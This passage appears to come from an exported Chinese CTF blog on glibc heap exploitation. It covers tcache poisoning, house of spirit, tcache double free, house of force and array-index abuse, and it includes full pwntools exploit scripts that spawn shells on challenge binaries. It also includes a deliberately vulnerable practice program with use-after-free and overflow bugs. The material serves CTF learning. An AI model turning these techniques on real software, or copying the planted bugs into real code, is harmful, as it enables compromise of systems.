开头），arena 的位置就位于堆空间上方，所以只要溢出修改 ptr 低位就可以将其指向 arena，从而泄漏 arena 上的 libc 地址（泄漏出来的地址恰好是 main arena 地址）。\ngetshell 方法是泄漏 libc 上的栈地址，然后将栈上的 main 函数返回地址修成 one gadget 地址。libc 上有两处地方可以泄漏栈地址，__environ 和 __libc_argv，这道题只能使用后者，因为前者地址的最低位恰好是空字节。\n栈需要修改两个地方，第一个是前面提到的 main 函数返回地址，第二个是 main 函数的 saved rbp。修改 saved rbp 是为了满足 one gadget 利用条件（下图这个），原来的 saved rbp 是数值 1，需要把它改成任意一个可写内存地址。\n0xebdb3 execve(&quot;/bin/sh&quot;, rbp-0x50, [rbp-0x70])constraints:  address rbp-0x50 is writable  [rbp-0x50] == NULL || rbp-0x50 == NULL  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL\n\nfrom pwn import *import warningswarnings.filterwarnings(&quot;ignore&quot;, category=BytesWarning)import timecontext(arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)p= process(&#x27;./heap&#x27;)elf = ELF(&#x27;./heap&#x27;)#p = remote(&quot;tcp.cloud.dasctf.com&quot;, 21479)libc = ELF(&quot;./libc-3.35.so&quot;)sla      = lambda x, y : p.sendlineafter(y, str(x) if not isinstance(x, bytes) else x) sl       = lambda x : p.sendline(str(x) if not isinstance(x, bytes) else x)sa       = lambda x, y : p.sendafter(y, str(x) if not isinstance(x, bytes) else x)   def add(ctx):    sla(f&quot;1 &#123;ctx&#125;&quot;, &quot;Your chocie:&quot;)    def show(ctx):    sla(f&quot;2 &#123;ctx&#125;&quot;, &quot;Your chocie:&quot;)def edit(idx, ctx):    pp = b&quot;3 &quot; + str(idx).encode() + b&quot;:&quot; + ctx    sla(pp, &quot;Your chocie:&quot;)def edit_no(idx, ctx):    pp = b&quot;3 &quot; + str(idx).encode() + b&quot;:&quot; + ctx    sl(pp)def free(idx):    sla(f&quot;4 &#123;idx&#125;&quot;, &quot;Your chocie:&quot;)    def free_no(idx):    sl(f&quot;4 &#123;idx&#125;&quot;)add(&quot;A&quot;*0x50) #chunk0add(&quot;B&quot;*0x68)add(&quot;C&quot;*0x61)add(&quot;a&quot;*0x50) #chunk3add(&quot;b&quot;*0x68)add(&quot;c&quot;*0x62)add(&quot;1&quot;*0x50) #chunk6add(&quot;2&quot;*0x68)add(&quot;3&quot;*0x66)add(&quot;1&quot;*0x50) #chunk9add(&quot;2&quot;*0x68)add(&quot;3&quot;*0x66)free(0)edit(2, b&quot;X&quot;*0x60+b&quot;\\x80&quot;)free(2)add(&quot;C&quot;*0x61) #chunk0add(&quot;A&quot;*0x50) #chunk2time.sleep(3)free(3)edit(5, b&quot;x&quot;*0x60+b&quot;\\xa0\\x08&quot;)free(5)add(&quot;c&quot;*0x62) #chunk3add(&quot;a&quot;*0x50) #chunk5time.sleep(3)show(4)p.recvuntil(&quot;paper content: &quot;)libc.address = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x219c80success(&quot;libcbase: 0x%lx&quot;, libc.address)p_stack = libc.address + 0x21aa20edit_no(1, p64(p_stack)[:6])time.sleep(3)show(0)p.recvuntil(&quot;paper content: &quot;)stack = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))main_ret_addr = stack-0x110success(&quot;stackbase: 0x%lx&quot;, libc.address)success(&quot;main ret address ptr: 0x%lx&quot;, main_ret_addr)free_no(6)edit(8, b&quot;0&quot;*0x60+p64(main_ret_addr-8)[:6])free(8)add(&quot;3&quot;*0x66) #chunk3add(&quot;1&quot;*0x50) #chunk5time.sleep(3)writable_ptr_b = p64(libc.address + 0x21c240)edit(7, writable_ptr_b[:6])free_no(9)edit(11, b&quot;0&quot;*0x60+p64(main_ret_addr)[:6])free(11)add(&quot;3&quot;*0x66) #chunk3add(&quot;1&quot;*0x50) #chunk5time.sleep(3)one_gadget_b =p64(libc.address + 0xEBD48)edit(10, one_gadget_b[:6])time.sleep(3)p.sendline(&quot;5&quot;)p.interactive()","categories":["wp"]},{"title":"tcachebin_attack","url":"/2023/08/30/tcachebin-attack/","content":"about tcache在glibc版本2.26(可以简单记成18.04后)以后，加入了tcache(Thread Local Caching)机制\n这里放上tcache的定义\n#if USE_TCACHE/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */# define TCACHE_MAX_BINS        64# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables.  */# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize().  */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size.  */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are...   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)   idx 1   bytes 25..40 or 13..20   idx 2   bytes 41..56 or 21..28   etc.  *//* This is another arbitrary limit, which tunables can change.  Each   tcache bin will hold at most this number of chunks.  */# define TCACHE_FILL_COUNT 7#endif\ntcache机制通过维护多个大小不同的链表来存储已被释放但尚未重新分配的堆块。每个链表对应一个特定的堆块大小，并且每个线程都有自己的tcache链表。当程序请求分配一个堆块时，tcache会首先检查是否有合适大小的空闲块可用，如果有，则直接从tcache中分配给程序。\ntcache机制主要有三个优点：\n减少了对全局锁的竞争：由于每个线程都有自己的tcache链表，所以线程之间不需要竞争全局锁，从而减少了锁的开销。快速的内存分配和释放：由于tcache只包含已经释放但尚未重新分配的堆块，所以可以快速地进行内存分配和释放操作。减少碎片化：tcache机制使得相同大小的堆块可以被重复使用，减少了堆内存的碎片化问题。\n它为每个线程创建一个缓存，里面包含了一些小堆块。每个线程默认使用64个单链表结构的bins，每个bins最多存放7个chunk，64位机器16字节递增，从0x20到0x410，也就是说位于以上大小的chunk释放后都会先行存入到tcache_bin中。对于每个tcache_bin单链表，它和fast_bin一样都是先进后出，而且prev_inuse标记位都不会被清除，所以tcache_bin中的chunk不会被合并，即使和Top_chunk相邻。\n  另外tcache机制出现后，每次产生堆都会先产生一个0x250大小的堆块，该堆块位于堆的开头，用于记录64个bins的地址（这些地址指向用户数据部分）以及每个bins中chunk数量。在这个0x250大小的堆块中，前0x40个字节用于记录每个bins中chunk数量，每个字节对应一条tcache_bin链的数量，从0x20开始到0x410结束，刚好64条链，然后剩下的每8字节记录一条tcache_bin链的开头地址，也是从0x20开始到0x410结束。还有一点值得注意的是，tcache_bin中的fd指针是指向malloc返回的地址，也就是用户数据部分。\nattack绕过tcache机制的方法在上一篇unsorted_bin里有说明\ntcache poisoning\n//gcc how2heap2.c -g -no-pie -o tcache_bin#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    // 在fck处分配堆块    unsigned long fck;    printf(&quot;fck addr is %p\\n&quot;, &amp;fck);    unsigned long * ptr = malloc(0x80);//chunk1    printf(&quot;malloc ptr addr is %p\\n&quot;, ptr);    free(ptr);    // 只需修改fd指针，申请的大小和当前tcache bin大小相同即可    ptr[0] = (unsigned long)&amp;fck;    malloc(0x80);//chunk2    printf(&quot;the second malloc addr is %p\\n&quot;, malloc(0x80));    return 0;&#125;\n攻击效果如下\npwndbg&gt; rStarting program: /home/str1k3/Desktop/tcache_bin fck addr is 0x7fffffffe2e8malloc ptr addr is 0x602670the second malloc addr is 0x7fffffffe2e8[Inferior 1 (process 3147) exited normally]\n可以看到chunk2的地址被修改到了0x7fffffffe2e8。\ntcache house of spirit\n//gcc tcache_house_of_spirit.c -g -no-pie -o tcache_house_of_spirit#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main()&#123;    unsigned long target[4];    malloc(1);  // 初始化堆环境        // 伪造fake_chunk，试图释放后再次分配得到该地址的堆块    printf(&quot;your target addr is %p\\n&quot;, target+2);    target[1] = 0x90;    free(target+2);    printf(&quot;now malloc addr is %p\\n&quot;, malloc(0x80));    //success     return 0;&#125;\nfree完fake_chunk后的bin：\npwndbg&gt; bintcachebins0x90 [  1]: 0x7fffffffe2d0 ◂— 0x0\n成功得到位于0x7fffffffe2d0的堆块\n该攻击关键在于构造好fake_chunk的size，以及释放堆块对应的用户数据地址\nleak_libc_base同unsorted_bin_attack\nleak_heap_baseeasy_double_free\nglibc版本2.28前，没有对tcache二次释放的检查因此在glibc_2.26到glibc_2.27的老版本之间可以利用double_free来泄露堆基址\n//gcc double_free.c -g -no-pie -o double_free#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;    unsigned long *ptr = malloc(0x80);    free(ptr);    free(ptr);  // double free    printf(&quot;heap addr is %ld\\n&quot;, ptr[0]);    return 0;&#125;\n这个过渡版的glibc有点难找，等环境搭起来再来复现easy_double_free\ndouble_free那么高版本的glibc能double_free吗？是可以的，先看看检查机制\ntypedef struct tcache_entry&#123;  struct tcache_entry *next;  //指向chunk的fd  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;  //指向chunk的bk&#125; tcache_entry;\n对于每一个tcache都有一个key指针指向\nsize_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查    if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins)    &#123;      /* Check to see if it&#x27;s already in the tcache.  */      tcache_entry *e = (tcache_entry *)chunk2mem(p);       /*        如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来      */      if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息      &#123;        tcache_entry *tmp;        LIBC_PROBE(memory_tcache_double_free, 2, e, tc_idx);        for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next)          if (tmp == e)            malloc_printerr(&quot;free(): double free detected in tcache 2&quot;);      &#125;       if (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)  //通过检查，放入tcahce中      &#123;        tcache_put(p, tc_idx);        return;      &#125;    &#125;\n所以 如果我们还想要使用tcache double free的话 就只能修改key字段\ndebug_exp:\nfrom pwn import*p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(b&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(b&quot;add something to your house\\n&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(b&#x27;every decision you made is meaningful&#x27;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(b&quot;It&#x27;s never too late to make changes&quot;)    p.sendline(str(index))    p.recvuntil(b&quot;something interesting here&quot;)    p.sendline(str(size))    p.sendlineafter(b&quot;Now add something&quot;,payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(b&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))add(0x10,b&#x27;aaaa&#x27;)delete(0)debug()payload = p64(0)*2edit(0,len(payload),payload)delete(0)p.interactive\n\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0xe3d000Size: 0x251Free chunk (tcachebins) | PREV_INUSEAddr: 0xe3d250Size: 0x21fd: 0x00Top chunk | PREV_INUSEAddr: 0xe3d270Size: 0x20d91pwndbg&gt; x/4gx 0xe3d2500xe3d250:\t0x0000000000000000\t0x00000000000000210xe3d260:\t0x0000000000000000\t0x0000000000e3d010pwndbg&gt; x/4gx 0xe3d0000xe3d000:\t0x0000000000000000\t0x00000000000002510xe3d010:\t0x0000000000000001\t0x0000000000000000\n可以看到所谓的key检查 也就是在tcachebin中的chunk的bk域存入tcache_perthread_struct结构体的地址\n也就是在堆基址处0x251大小的chunk\n跟着exp走，可以成功把处于tcachebin中的chunk的bk域清空这样再次free的时候就不会触发double free\n[CISCN 2021 初赛]lonelywolf保护全开，四肢健全add仅能有一个chunk，最大size&#x3D;0x78 free存在UAF先考虑用一次double free来泄露堆地址\nadd(0x78)free()edit(p64(0)*2)free()show()p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x260\n第二次free前的结构double free后，该chunk的bk指向该chunk的地址，可用于泄露heapbase随后通过攻击tcache struct来分配一个0x250的堆块后使其进入unsorted bin来泄露libc\nedit(p64(heap_base + 0x10))add(0x78)add(0x78)edit(b&#x27;\\x00&#x27;*35 + b&#x27;\\x07&#x27;)free()show()libc_base = u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;)) - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]\n攻击造成的后果：后续再修改tcache struct来打freehook即可\nedit(b&#x27;\\x01\\x01&#x27; + b&#x27;\\xff&#x27;*0x3e + p64(free_hook) + p64(heap_base + 0x260))add(0x10)edit(p64(system))add(0x20)edit(b&#x27;/bin/sh\\x00&#x27;)\n后面的堆结构在gdb看来就寄了，这里记录一下：\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def get_sb():    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&#x27;./lonelywolf&#x27;)#p = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28681)elf = ELF(&#x27;./lonelywolf&#x27;)#libc = ELF(&#x27;./libc-2.27-x64.so&#x27;)libc = ELF(&#x27;/home/str1k3/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6&#x27;)def add(size):    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;, str(size))def edit(content):    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)    p.sendlineafter(b&#x27;Content: &#x27;, content)def show():    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)def free():    p.sendlineafter(b&#x27;choice: &#x27;, b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;, b&#x27;0&#x27;)debug()# leak heap_baseadd(0x78)free()edit(p64(0)*2)free()show()p.recvuntil(b&#x27;Content: &#x27;)heap_base = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x260# double free -&gt; tcache struct -&gt; leak libc_baseedit(p64(heap_base + 0x10))add(0x78)add(0x78)edit(b&#x27;\\x00&#x27;*35 + b&#x27;\\x07&#x27;)free()show()libc_base = get_addr() - 0x70 - libc.sym[&#x27;__malloc_hook&#x27;]# free_hook -&gt; systemfree_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]one_gadget = libc_base + 0x10a38csystem = libc_base + libc.sym[&#x27;system&#x27;]edit(b&#x27;\\x01\\x01&#x27; + b&#x27;\\xff&#x27;*0x3e + p64(free_hook) + p64(heap_base + 0x260))add(0x10)edit(p64(system))add(0x20)edit(b&#x27;/bin/sh\\x00&#x27;)# pwnfree()p.interactive()\n\nglibc2.29加入了stash机制，导致tcachebin存在与fastbin以及smallbin的‘联动’漏洞，写完fastbin和smallbin再回来补充前面的攻击手段，以后再来探索吧~\n","categories":["heap"],"tags":["bin"]},{"title":"ycb_final_review","url":"/2023/09/16/ycb-offline-review/","content":"剃头，仍需努力点击下载\neasy_forcechecksec\n└─$ checksec pwn[*] &#x27;/mnt/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n本地debug不大行house of force打完会：\n[DEBUG] Received 0x1d bytes:    b&#x27;malloc(): corrupted top size\\n&#x27;\n只能写一次\nvoid __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123;  int v3; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  sub_4007D6(a1, a2, a3);  puts(&quot;This day is schoolday,now teacher ask u to write somethings on the balckbroad&quot;);  puts(&quot;the teacher will leave some space on the balckbroad&quot;);  puts(&quot;u only give 4 times to reply&quot;);  while ( 1 )  &#123;    while ( 1 )    &#123;      sub_400961();      __isoc99_scanf(&quot;%d&quot;, &amp;v3);      if ( v3 != 2 )        break;      sub_40093F();    &#125;    if ( v3 &gt; 2 )    &#123;      if ( v3 == 3 )      &#123;        sub_400950();      &#125;      else if ( v3 == 4 )      &#123;        exit(1);      &#125;    &#125;    else if ( v3 == 1 )    &#123;      sub_400819();    &#125;  &#125;&#125;\nadd存在堆溢出没有对申请的size进行检查\nunsigned __int64 sub_400819()&#123;  unsigned int v1; // [rsp+4h] [rbp-1Ch] BYREF  size_t v2; // [rsp+8h] [rbp-18h] BYREF  void *v3; // [rsp+10h] [rbp-10h]  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  puts(&quot;which index?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( v1 &gt; 4 || *(&amp;buf + (int)v1) )  &#123;    puts(&quot;already exist!&quot;);    exit(1);  &#125;  puts(&quot;how much space do u want?&quot;);  __isoc99_scanf(&quot;%ld&quot;, &amp;v2);  size[v1] = v2;  v3 = malloc(size[v1]);//无size检查  *(&amp;buf + (int)v1) = v3;  puts(&quot;now what to write?&quot;);  read(0, *(&amp;buf + (int)v1), 0x30uLL);//存在堆溢出  printf(&quot;the balckbroad on %p is in use\\n&quot;, *(&amp;buf + (int)v1));  return __readfsqword(0x28u) ^ v4;&#125;\n打house of force泄露libc_base 和heap_base打完的堆：\npwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0xa09000Size: 0x290 (with flag bits: 0x291)Allocated chunk | PREV_INUSEAddr: 0xa09290Size: 0x1010 (with flag bits: 0x1011)Allocated chunk | PREV_INUSEAddr: 0xa0a2a0Size: 0x20 (with flag bits: 0x21)Top chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENAAddr: 0xa0a2c0Size: 0xfffffffffffffff8 (with flag bits: 0xffffffffffffffff)\n\n然后把malloc_got改为system\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)p = process(&#x27;./pwn&#x27;)#p = remote(&#x27;10.1.102.102&#x27;, 10002)    def menu(idx):    p.sendlineafter(&#x27;away&#x27;, str(idx))def add(idx, size, data):    menu(1)    p.sendlineafter(&#x27;which index?&#x27;, str(idx))    p.sendlineafter(&#x27;space do u want?&#x27;, str(size))    p.sendafter(&#x27;what to write?&#x27;, data)add(0, 0x60000, b&#x27;\\n&#x27;)p.recvuntil(b&#x27;the balckbroad on &#x27;)libc_base = int(p.recvuntil(b&#x27; &#x27;), 16) - 0x58b010success(&#x27;libc_base:%s&#x27;, hex(libc_base))system = libc_base + libc.sym[&#x27;system&#x27;]payload = b&#x27;/bin/sh&#x27;.ljust(0x18, b&#x27;\\x00&#x27;) + p64(0xffffffffffffffff)add(1, 0x18, payload)p.recvuntil(b&#x27;the balckbroad on &#x27;)heap_base = int(p.recvuntil(b&#x27; &#x27;), 16)success(&#x27;heap_base:%s&#x27;,hex(heap_base))malloc_got = elf.got[&#x27;malloc&#x27;]top_chunk = heap_base + 0x10target_addr = malloc_got - 0x20 - top_chunkadd(2, target_addr, &#x27;\\n&#x27;)add(3, 0x18, p64(system) * 2)menu(1)p.sendlineafter(&#x27;which index?&#x27;, str(4))p.sendlineafter(&#x27;space do u want?&#x27;, str(heap_base))p.interactive()\n\narrary_index_bank\n└─$ checksec pwn1[*] &#x27;/mnt/ycbpwn/pwn1&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      PIE enabled\nsuper_ai里存在整数溢出，数组元素为负数时可以泄露数据赛场上不知道泄露的是什么现在才知道能泄露程序地址\n__int64 super_ai()&#123;  __int64 v1[3]; // [rsp+0h] [rbp-30h] BYREF  __int64 v2; // [rsp+18h] [rbp-18h]  __int64 v3; // [rsp+20h] [rbp-10h]  __int64 v4; // [rsp+28h] [rbp-8h]  puts(&quot;Hi, welcome to Samman Fried-Bank!&quot;);  puts(&quot;We totally care about your money, give it all to us!!!!&quot;);  puts(&quot;We can go to the ~~moon~~ *cough* I mean we are totally regulated!&quot;);  v1[crypto_bro] = 384400LL;  v1[you] = 1000LL;  while ( 1 )  &#123;    while ( 1 )    &#123;      v1[you] -= rand() % 100;      if ( v1[you] &lt;= 0 )      &#123;        puts(&quot;sorry you are too poor bye! (overdraft fees sounds like a profitable idea hmmm....)&quot;);        return 1LL;      &#125;      menu(v1);      v4 = read_long();      if ( v4 != 1 )        break;      puts(&quot;Whose account?&quot;);      v3 = read_long();      if ( v3 &gt; you )      &#123;        puts(&quot;???&quot;);        exit(1);      &#125;      printf(&quot;accounts[%lld] = %lld\\n&quot;, v3, v1[v3]);    &#125;    if ( v4 != 2 )      break;    puts(&quot;Whose account?&quot;);    v3 = read_long();    if ( v3 &gt; you )    &#123;      puts(&quot;???&quot;);      exit(1);    &#125;    puts(&quot;How much?&quot;);    v2 = read_long();    v1[v3] = v2;    puts(&quot;Deposited! Your money is safe with us 100% guarenteed!&quot;);  &#125;  puts(&quot;Sorry, please be civil with our bank AIs, we haven&#x27;t figured ChatGPT yet.&quot;);  return 1LL;&#125;\n偏移不会算，最后也没有打通exp存给自己看了\nfrom pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf = ELF(&#x27;./pwn1&#x27;)p = process(&#x27;./pwn1&#x27;)#p = remote(&#x27;10.1.102.102&#x27;, 10000)    def debug(pro,bp):    gdb.attach(pro,str(bp))    pause()    def show(idx):    p.sendlineafter(&#x27;You current have&#x27;, &#x27;1&#x27;)    p.sendlineafter(&#x27;Whose account?&#x27;, str(-0x8000000000000000 + idx))def write(idx, data):    p.sendlineafter(&#x27;You current have&#x27;, &#x27;2&#x27;)    p.sendlineafter(&#x27;Whose account?&#x27;, str(-0x8000000000000000 + idx))   # 7 ret    p.sendlineafter(&#x27;How much?&#x27;, str(data))show(7)p.recvuntil(&#x27;] = &#x27;)codebase = int(p.recv(14), 10) - 0x151b #开了pie，可以用偏移来搞地址了success(&#x27;codebase:%s&#x27;, hex(codebase))#debug(p,&#x27;b *$rebase(0x14D2)&#x27;)backdoor = codebase + 0x1315write(7, backdoor)p.sendlineafter(&#x27;You current have&#x27;, &#x27;3&#x27;)p.interactive()\n\n有空接着写break&amp;fix，挖大坑\n","categories":["wp"]},{"title":"preparation_4_binattacks","url":"/2023/08/28/preparation-4-binattacks/","content":"写了段代码来gank接下来的堆,之后几篇文章都用这作为二进制文件基础\n//gcc 2heap.c  -no-pie -o 2heap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;what u want to do next?&quot;);    puts(&quot;1. Build a house&quot;);\tputs(&quot;2. Delete a house&quot;);\tputs(&quot;3. Edit your house&quot;);\tputs(&quot;4. Show your house&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    char size[20];    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;You have built %d houses in my world\\n&quot;,chunk_time);        puts(&quot;You can customize the size of house here, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);\t\tchunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);\t\tputs(&quot;add something to your house&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;something wrong,but you can come in any time&quot;);            exit(0);        &#125;    &#125;else&#123;                puts(&quot;something wrong,but you can come in any time&quot;);        exit(0);    &#125;&#125;void delete()&#123;    int index;    puts(&quot;I won&#x27;t set the pointer to zero&quot;);    puts(&quot;every decision you made is meaningful&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;something wrong?&quot;);    puts(&quot;It&#x27;s never too late to make changes&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;something interesting here&quot;);    read(0,&amp;chunk_size[index],0x8);    puts(&quot;Nice choice!&quot;);    puts(&quot;Now add something&quot;);    read(0,chunk_ptr[index],chunk_size[index]);    puts(&quot;ok\\n&quot;);&#125;void show()&#123;    puts(&quot;Nothing is perfect,but you can make something different&quot;);    puts(&quot;Let&#x27;s see what you can do&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to explore something about heap&quot;);    puts(&quot;written by str1k3&quot;);    puts(&quot;Welcome to my world!&quot;);    puts(&quot;In my world,you can build up some houses&quot;);        while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;ready to exit?&quot;);                puts(&quot;back to your life!&quot;);                exit(0);                break;        &#125;    &#125;&#125;\n其实人生，并非虚耗。何来尘埃飞舞？ ——陈奕迅《沙龙》\n扔个测试脚本在这里先\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(&quot;add something to your house&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(&quot;I won&#x27;t set the pointer to zero, every decision you made,is meaningful.&quot;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(&quot;It&#x27;s never too late to make changes.&quot;)    p.sendline(str(index))    p.recvuntil(&quot;something interesting here&quot;)    p.sendline(str(size))    p.recvuntil(&quot;Nice choice!&quot;)    p.send(payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))\n\n","categories":["heap"],"tags":["bin"]},{"title":"unsortedbin_attack","url":"/2023/08/29/unsortedbin-attack/","content":"unsortedbin_attack，part leak在glibc版本2.26(可以简单记成18.04后)以后，加入了tcachebin机制针对tcachebin机制的攻击之后再聊\n回到unsortedbin，tcachebin机制的加入主要影响的是大小小于fastbin或tcachebin的堆块大于此的堆块被free后会直接进入unsortedbin小于此的堆块被free后会进入tcachebin，直到tcachebin的一条链表被填满（7个chunk）所以我们只要用7个chunk填满它，就能绕过tcachebin机制，进入unsortedbindebug_code:\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;char *heap[0x20];int num=0;int getnum()&#123;\t  char s[24]; // [rsp+0h] [rbp-20h] BYREF  uint64_t v1; // [rsp+18h] [rbp-8h]  v1 = read(0x28u);  memset(s, 0, sizeof(s));  read(0, s, 0x17uLL);  return atoi(s);&#125;int create()&#123;    int size;    int result;    puts(&quot;input your size:&quot;);    size = getnum();    heap[num]=(char *)malloc(size);    result = num++;    puts(&quot;success!&quot;);    return result;&#125;void show()&#123;\tint idx;\tputs(&quot;idx:&quot;);\tidx = getnum(); \tif (!heap[idx]) \t&#123;    \tputs(&quot;nothing here\\n&quot;);\t&#125; \telse &#123;    printf(&quot;content:&quot;);    printf(&quot;%s&quot;,heap[idx]);  &#125;&#125;void dele()&#123;\tint idx;  \tputs(&quot;idx:&quot;);  \tidx = getnum();\tif (!heap[idx]) \t&#123;    puts(&quot;nothing here\\n&quot;);\t&#125; \telse \t&#123;    free(heap[idx]);    heap[idx]=NULL;    num--;    puts(&quot;success!&quot;);\t&#125;&#125;void edit()&#123;\tint size;\tint idx;\tputs(&quot;idx:&quot;);  \tidx = getnum();\tif 